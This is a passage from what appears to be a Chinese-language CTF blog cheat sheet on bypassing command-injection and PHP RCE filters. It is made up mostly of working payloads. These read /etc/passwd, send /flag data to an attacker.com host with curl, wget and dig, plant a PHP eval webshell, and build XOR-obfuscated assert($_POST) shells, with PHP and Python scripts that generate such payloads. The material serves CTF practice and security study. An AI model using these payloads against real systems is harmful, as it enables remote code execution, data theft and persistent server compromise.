<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># Unicode encoding</span></span><br><span class="line">㎈㎉㎊㎋㎌㎍㎎  <span class="comment"># Using Unicode lookalikes</span></span><br></pre></td></tr></table></figure>



<h3 id="6-5-十六进制"><a href="#6-5-十六进制" class="headerlink" title="6.5 十六进制"></a>6.5 十六进制</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -n <span class="string">&quot;whoami&quot;</span> | xxd -p   <span class="comment">#（-n让echo不输出换行符）</span></span><br><span class="line">bash &lt;&lt;&lt; $(xxd -r -p &lt;&lt;&lt; <span class="string">776863616D69)</span></span><br><span class="line"><span class="string">xxd -r -p：</span></span><br><span class="line"><span class="string">xxd 是一个用于创建十六进制转储（hex dump）或进行反向操作的工具。</span></span><br><span class="line"><span class="string">-r：反向操作（reverse），将十六进制转储转换回二进制数据。</span></span><br><span class="line"><span class="string">-p：以纯十六进制转储模式处理输入，没有地址信息和列格式。</span></span><br><span class="line"><span class="string">所以 xxd -r -p 会将纯十六进制字符串 776863616D69</span> 转换回其对应的ASCII字符 <span class="built_in">whoami</span>。</span><br><span class="line"></span><br><span class="line">$(<span class="built_in">echo</span> -e <span class="string">&quot;\x77\x68\x6f\x61\x6d\x69&quot;</span>) <span class="comment"># whoami in hex</span></span><br></pre></td></tr></table></figure>



<h2 id="7-空格过滤绕过"><a href="#7-空格过滤绕过" class="headerlink" title="7. 空格过滤绕过"></a>7. 空格过滤绕过</h2><h3 id="7-1-特殊变量替代"><a href="#7-1-特殊变量替代" class="headerlink" title="7.1  特殊变量替代"></a>7.1  特殊变量替代</h3><ul>
<li><p><code>$IFS</code>：内部字段分隔符</p>
</li>
<li><p><code>$&#123;IFS&#125;</code>：同上</p>
</li>
<li><p><code>$IFS$9</code>：$9为空变量，用于截断</p>
</li>
<li><p><code>%09</code></p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span><span class="variable">$IFS</span>/etc/passwd</span><br><span class="line"><span class="built_in">cat</span><span class="variable">$&#123;IFS&#125;</span>/etc/passwd</span><br><span class="line"><span class="built_in">cat</span>$IFS<span class="variable">$9</span>/etc/passwd</span><br></pre></td></tr></table></figure>



<h3 id="7-2-重定向符号替代"><a href="#7-2-重定向符号替代" class="headerlink" title="7.2  重定向符号替代"></a>7.2  重定向符号替代</h3><ul>
<li><p><code>&lt;</code>：输入重定向</p>
</li>
<li><p><code>&lt;&gt;</code>：输入输出重定向</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span>&lt;/etc/passwd</span><br><span class="line"><span class="built_in">cat</span>&lt;&gt;/etc/passwd</span><br></pre></td></tr></table></figure>



<h3 id="7-3-大括号替代"><a href="#7-3-大括号替代" class="headerlink" title="7.3 大括号替代"></a>7.3 大括号替代</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="built_in">cat</span>,/etc/passwd&#125;</span><br></pre></td></tr></table></figure>



<h3 id="7-4-URL编码替代"><a href="#7-4-URL编码替代" class="headerlink" title="7.4 URL编码替代"></a>7.4 URL编码替代</h3><ul>
<li><p><code>%09</code>：TAB键（URL编码）</p>
</li>
<li><p><code>%20</code>：空格（URL编码）</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://example.com?cmd=<span class="built_in">cat</span>%09/etc/passwd</span><br></pre></td></tr></table></figure>



<h3 id="7-5-其他特殊形式"><a href="#7-5-其他特殊形式" class="headerlink" title="7.5 其他特殊形式"></a>7.5 其他特殊形式</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X=$<span class="string">&#x27;cat\x20/etc/passwd&#x27;</span>&amp;&amp;<span class="variable">$X</span></span><br></pre></td></tr></table></figure>



<h2 id="8-分隔符过滤绕过"><a href="#8-分隔符过滤绕过" class="headerlink" title="8.  分隔符过滤绕过"></a>8.  分隔符过滤绕过</h2><h3 id="8-1-常用分隔符"><a href="#8-1-常用分隔符" class="headerlink" title="8.1 常用分隔符"></a>8.1 常用分隔符</h3><ul>
<li><p><code>;</code>：顺序执行多条命令（无论前面真假）</p>
</li>
<li><p><code>|</code>：管道符，只执行后面命令，前面输出作为后面输入</p>
</li>
<li><p><code>||</code>：前面执行失败才执行后面</p>
</li>
<li><p><code>&amp;</code>：两条命令都会执行（无论前面真假）</p>
</li>
<li><p><code>&amp;&amp;</code>：前面成功才执行后面</p>
</li>
</ul>
<h3 id="8-2-换行符和回车符"><a href="#8-2-换行符和回车符" class="headerlink" title="8.2  换行符和回车符"></a>8.2  换行符和回车符</h3><ul>
<li><p><code>%0a</code>：换行符（URL编码）</p>
</li>
<li><p><code>%0d</code>：回车符（URL编码）</p>
</li>
</ul>
<h3 id="8-3-PHP特定绕过"><a href="#8-3-PHP特定绕过" class="headerlink" title="8.3  PHP特定绕过"></a>8.3  PHP特定绕过</h3><ul>
<li><code>?&gt;</code>：可以代替最后一个分号</li>
</ul>
<h2 id="9-无回显处理技巧"><a href="#9-无回显处理技巧" class="headerlink" title="9. 无回显处理技巧"></a>9. 无回显处理技巧</h2><h3 id="9-1-时间盲注"><a href="#9-1-时间盲注" class="headerlink" title="9.1 时间盲注"></a>9.1 时间盲注</h3><p>通过延时判断命令是否执行成功：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> &amp;&amp; <span class="built_in">sleep</span> 3 <span class="comment"># 执行成功则休眠3秒</span></span><br><span class="line"><span class="built_in">ls</span> || <span class="built_in">sleep</span> 3 <span class="comment"># 执行失败则休眠3秒</span></span><br></pre></td></tr></table></figure>



<h3 id="9-2-HTTP外带数据"><a href="#9-2-HTTP外带数据" class="headerlink" title="9.2  HTTP外带数据"></a>9.2  HTTP外带数据</h3><p>通过HTTP请求将数据外带：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用curl</span></span><br><span class="line">curl http://attacker.com/record.php?data=$(<span class="built_in">cat</span> /flag | <span class="built_in">base64</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用wget</span></span><br><span class="line">wget http://attacker.com/record.php?data=$(<span class="built_in">cat</span> /flag | <span class="built_in">base64</span>)</span><br></pre></td></tr></table></figure>



<h3 id="9-3-DNS外带数据"><a href="#9-3-DNS外带数据" class="headerlink" title="9.3 DNS外带数据"></a>9.3 DNS外带数据</h3><p>通过DNS查询外带数据：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将数据作为子域名查询</span></span><br><span class="line"><span class="built_in">cat</span> /flag | xargs -I &#123;&#125; dig &#123;&#125;.attacker.com</span><br></pre></td></tr></table></figure>



<h3 id="9-4-写入文件后访问"><a href="#9-4-写入文件后访问" class="headerlink" title="9.4 写入文件后访问"></a>9.4 写入文件后访问</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 复制文件</span></span><br><span class="line"><span class="built_in">cp</span> /flag /var/www/html/flag.txt</span><br><span class="line"><span class="built_in">cat</span> /flag &gt; /var/www/html/flag.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 压缩文件</span></span><br><span class="line">tar zcvf /var/www/html/flag.tar.gz /flag</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建Webshell</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span> &gt; /var/www/html/shell.php</span><br></pre></td></tr></table></figure>



<h2 id="10-长度限制绕过"><a href="#10-长度限制绕过" class="headerlink" title="10. 长度限制绕过"></a>10. 长度限制绕过</h2><h3 id="10-1-短命令生成"><a href="#10-1-短命令生成" class="headerlink" title="10.1 短命令生成"></a>10.1 短命令生成</h3><p>（1）、通过文件创建和ls排序构造命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建短文件名</span></span><br><span class="line">&gt;ag</span><br><span class="line">&gt;fl\\</span><br><span class="line">&gt;t\\</span><br><span class="line">&gt;ca\\</span><br><span class="line"></span><br><span class="line"><span class="comment"># 按时间排序写入文件</span></span><br><span class="line"><span class="built_in">ls</span> -t &gt; x</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行命令</span></span><br><span class="line">sh x</span><br></pre></td></tr></table></figure>

<p>（2）、创建文件名可以连成要执行命令的空文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost test]# ls</span><br><span class="line">flag.php</span><br><span class="line">[root@localhost test]# &gt;&quot;php&quot;</span><br><span class="line">[root@localhost test]# &gt;&quot;ag.\\&quot;</span><br><span class="line">[root@localhost test]# &gt;&quot;fl\\&quot;</span><br><span class="line">[root@localhost test]# &gt;&quot;t \\&quot;</span><br><span class="line">[root@localhost test]# &gt;&quot;ca\\&quot;</span><br><span class="line">[root@localhost test]# </span><br><span class="line">用2个反斜杠的原因：用前1个反斜杠转义后1个反斜杠</span><br></pre></td></tr></table></figure>

<p>执行<code>ls -t&gt;getflag</code>将目录下的文件名按时间排序后写进getflag文件里</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost test]# ls -t&gt;getflag</span><br><span class="line">[root@localhost test]# ls -t</span><br><span class="line">getflag  ca\  t \  fl\  ag.\  php  flag.php</span><br><span class="line">[root@localhost test]#</span><br><span class="line">[root@localhost test]# cat getflag</span><br><span class="line">getflag</span><br><span class="line">ca\</span><br><span class="line">t \</span><br><span class="line">fl\</span><br><span class="line">ag.\</span><br><span class="line">php</span><br><span class="line">flag.php</span><br></pre></td></tr></table></figure>

<p>执行<code>sh getflag</code>命令，从getflag文件中读取命令来执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost test]# sh getflag</span><br><span class="line">getflag:行1: getflag: 未找到命令</span><br><span class="line">12345 you get it</span><br><span class="line">getflag:行7: flag.php: 未找到命令</span><br></pre></td></tr></table></figure>

<h3 id="10-2-环境变量扩展"><a href="#10-2-环境变量扩展" class="headerlink" title="10.2  环境变量扩展"></a>10.2  环境变量扩展</h3><p>通过环境变量存储数据：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将命令存储在环境变量中</span></span><br><span class="line"><span class="built_in">export</span> CMD=<span class="string">&quot;cat /flag&quot;</span></span><br><span class="line"><span class="variable">$CMD</span></span><br></pre></td></tr></table></figure>



<h3 id="10-3-通过换行连接"><a href="#10-3-通过换行连接" class="headerlink" title="10.3  通过换行连接"></a>10.3  通过换行连接</h3><p>使用反斜杠换行连接长命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">c\</span><br><span class="line">a\</span><br><span class="line">t\</span><br><span class="line"> /f\</span><br><span class="line">l\</span><br><span class="line">a\</span><br><span class="line">g</span><br></pre></td></tr></table></figure>



<h2 id="11-无参数RCE绕过"><a href="#11-无参数RCE绕过" class="headerlink" title="11. 无参数RCE绕过"></a>11. 无参数RCE绕过</h2><p>参考：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/242482.html">https://www.freebuf.com/articles/system/242482.html</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;    </span><br><span class="line">    <span class="built_in">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="11-1-目录遍历读取"><a href="#11-1-目录遍历读取" class="headerlink" title="11.1 目录遍历读取"></a>11.1 目录遍历读取</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 查看当前目录</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localeconv</span>())));</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;.&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查看上级目录</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">dirname</span>(<span class="title function_ invoke__">getcwd</span>())));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读取文件</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">dirname</span>(<span class="title function_ invoke__">getcwd</span>()))));</span><br><span class="line"><span class="title function_ invoke__">readfile</span>(<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">dirname</span>(<span class="title function_ invoke__">getcwd</span>()))));</span><br></pre></td></tr></table></figure>



<h3 id="11-2-Session-ID利用"><a href="#11-2-Session-ID利用" class="headerlink" title="11.2 Session ID利用"></a>11.2 Session ID利用</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 通过hex2bin解码Session ID中的命令</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">session_id</span>(<span class="title function_ invoke__">session_start</span>())));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置Cookie: PHPSESSID=706870696e666f28293b (phpinfo();的hex)</span></span><br></pre></td></tr></table></figure>



<h3 id="11-3-HTTP头利用"><a href="#11-3-HTTP头利用" class="headerlink" title="11.3  HTTP头利用"></a>11.3  HTTP头利用</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取HTTP头并执行</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="title function_ invoke__">pos</span>(<span class="title function_ invoke__">getallheaders</span>()));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在最后一个HTTP头中放入: cmd: system(&#x27;ls&#x27;);</span></span><br></pre></td></tr></table></figure>



<h3 id="11-4-全局变量利用"><a href="#11-4-全局变量利用" class="headerlink" title="11.4  全局变量利用"></a>11.4  全局变量利用</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 通过GET参数执行</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">get_defined_vars</span>())));</span><br><span class="line"><span class="comment">// URL: ?0=system(&#x27;ls&#x27;);&amp;1=a</span></span><br></pre></td></tr></table></figure>



<h2 id="12-无字母数字绕过"><a href="#12-无字母数字绕过" class="headerlink" title="12. 无字母数字绕过"></a>12. 无字母数字绕过</h2><p>Reference：<a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/109143413">https://blog.csdn.net/miuzzx/article/details/109143413</a></p>
<p><a target="_blank" rel="noopener" href="https://arsenetang.github.io/2021/07/28/RCE%E7%AF%87%E4%B9%8B%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97rce/">https://arsenetang.github.io/2021/07/28/RCE%E7%AF%87%E4%B9%8B%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97rce/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/279563.html">https://www.freebuf.com/articles/network/279563.html</a></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(preg_match(&#x27;/[a-z0-9]/i&#x27;,$code))&#123;</span><br><span class="line">    die(&#x27;hacker&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="12-1-异或运算绕过"><a href="#12-1-异或运算绕过" class="headerlink" title="12.1  异或运算绕过"></a>12.1  异或运算绕过</h3><p>搬运自：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/279563.html">https://www.freebuf.com/articles/network/279563.html</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$_</span>=(<span class="string">&#x27;%01&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%13&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%13&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%05&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%12&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%14&#x27;</span>^<span class="string">&#x27;`&#x27;</span>); // <span class="variable">$_</span>=<span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="string">&#x27;_&#x27;</span>.(<span class="string">&#x27;%0D&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;%2F&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%0E&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;%09&#x27;</span>^<span class="string">&#x27;]&#x27;</span>); // <span class="variable">$__</span>=<span class="string">&#x27;_POST&#x27;</span>;</span><br><span class="line"><span class="variable">$___</span>=$<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$___</span>[_]); // assert(<span class="variable">$_POST</span>[_]);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>看到代码中的下划线_、__、___是一个变量，因为 preg_match() 过滤了所有的字母，我们只能用下划线来作变量名。最后拼接起来 Payload 如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=(<span class="string">&#x27;%01&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%13&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%13&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%05&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%12&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%14&#x27;</span>^<span class="string">&#x27;`&#x27;</span>);<span class="variable">$__</span>=<span class="string">&#x27;_&#x27;</span>.(<span class="string">&#x27;%0D&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;%2F&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%0E&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;%09&#x27;</span>^<span class="string">&#x27;]&#x27;</span>);<span class="variable">$___</span>=$<span class="variable">$__</span>;<span class="variable">$_</span>(<span class="variable">$___</span>[_]);</span><br><span class="line"></span><br><span class="line">// 密码为 <span class="string">&quot;_&quot;</span></span><br></pre></td></tr></table></figure>





<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 生成异或payload的脚本</span></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;xor_rce.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">            <span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">            <span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$preg</span> = <span class="string">&#x27;/[a-z0-9]/i&#x27;</span>; <span class="comment">// 根据题目正则修改</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line">            <span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line">            <span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)^<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line">                <span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&#x20;     首先运行以上 PHP 脚本后，会生成一个 txt 文档 xor_rce.txt，里面包含所有可见字符的异或构造结果。</p>
<p>接着运行以下 Python 脚本，输入你想要构造的函数名和要执行的命令即可生成最终的 Payload：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">s1=<span class="string">&quot;&quot;</span></span><br><span class="line">s2=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&quot;xor_rce.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">t=f.readline()</span><br><span class="line"><span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line"><span class="comment">#print(i)</span></span><br><span class="line">s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">f.close()</span><br><span class="line">output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;^\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line"><span class="keyword">return</span>(output)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">param=action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>) )+action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command：&quot;</span>))+<span class="string">&quot;;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(param)</span><br></pre></td></tr></table></figure>

